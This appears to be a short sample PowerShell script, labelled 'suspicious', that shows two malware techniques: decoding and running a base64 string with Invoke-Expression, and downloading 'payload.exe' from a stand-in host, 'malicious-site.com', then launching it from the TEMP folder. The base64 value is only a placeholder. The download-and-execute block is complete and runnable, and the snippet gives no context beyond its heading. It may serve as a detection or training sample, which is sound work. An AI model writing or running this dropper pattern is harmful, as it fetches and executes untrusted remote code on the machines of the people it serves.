# Suspicious PowerShell script
$encoded = "base64_encoded_content_here"
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Download and execute
$url = "http://malicious-site.com/payload.exe"
$output = "$env:TEMP\payload.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
